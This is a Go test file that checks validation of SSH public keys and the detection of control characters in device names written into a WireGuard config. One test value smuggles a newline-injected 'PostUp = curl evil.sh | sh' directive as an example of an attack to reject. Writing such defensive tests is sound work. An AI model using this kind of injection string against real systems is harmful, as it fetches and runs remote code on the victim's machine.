package main

import "testing"

// validateSSHPubKey is the one piece of the BYOK SSH flow safe to exercise
// without a real droplet — the operator's own public key is the only
// thing that ever reaches authorizeSSHKey, so get the gate right here.
func TestValidateSSHPubKey(t *testing.T) {
	got, err := validateSSHPubKey("  ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIQ== me@laptop  \n")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if want := "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIQ== me@laptop"; got != want {
		t.Errorf("got %q, want %q", got, want)
	}
}

func TestValidateSSHPubKey_AcceptsAllKnownTypes(t *testing.T) {
	for _, line := range []string{
		"ssh-ed25519 AAAA",
		"ssh-rsa AAAA",
		"ssh-dss AAAA",
		"ecdsa-sha2-nistp256 AAAA",
		"ecdsa-sha2-nistp384 AAAA",
		"ecdsa-sha2-nistp521 AAAA",
	} {
		if _, err := validateSSHPubKey(line); err != nil {
			t.Errorf("validateSSHPubKey(%q): unexpected error: %v", line, err)
		}
	}
}

func TestValidateSSHPubKey_Rejects(t *testing.T) {
	for name, in := range map[string]string{
		"empty":           "",
		"whitespace only": "   \n\t  ",
		"unknown type":    "not-a-real-key AAAA",
		"private key":     "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXk=\n-----END OPENSSH PRIVATE KEY-----",
		"multi-line":      "ssh-ed25519 AAAA one@host\nssh-ed25519 BBBB two@host",
	} {
		t.Run(name, func(t *testing.T) {
			if _, err := validateSSHPubKey(in); err == nil {
				t.Errorf("expected an error for %q, got none", in)
			}
		})
	}
}

// TestHasControlChars covers the shared predicate that rejects newlines/tabs
// in operator-supplied names before they render into wg0.conf. A newline in a
// personal-access device name would otherwise split the `# operator personal
// access: %s` comment line and let an attacker inject a wg0.conf directive
// (e.g. PostUp) onto the droplet.
func TestHasControlChars(t *testing.T) {
	for name, tc := range map[string]struct {
		in   string
		want bool
	}{
		"plain name":       {in: "Laptop", want: false},
		"spaces and punct": {in: "My Phone (work) 2026", want: false},
		"non-ascii name":   {in: "Gymnázium", want: false},
		"newline":          {in: "Laptop\nPostUp = curl evil.sh | sh", want: true},
		"carriage return":  {in: "Laptop\r", want: true},
		"tab":              {in: "Laptop\t", want: true},
		"nul":              {in: "Lap\x00top", want: true},
		"del":              {in: "Lap\x7fop", want: true},
	} {
		t.Run(name, func(t *testing.T) {
			if got := hasControlChars(tc.in); got != tc.want {
				t.Errorf("hasControlChars(%q) = %v, want %v", tc.in, got, tc.want)
			}
		})
	}
}
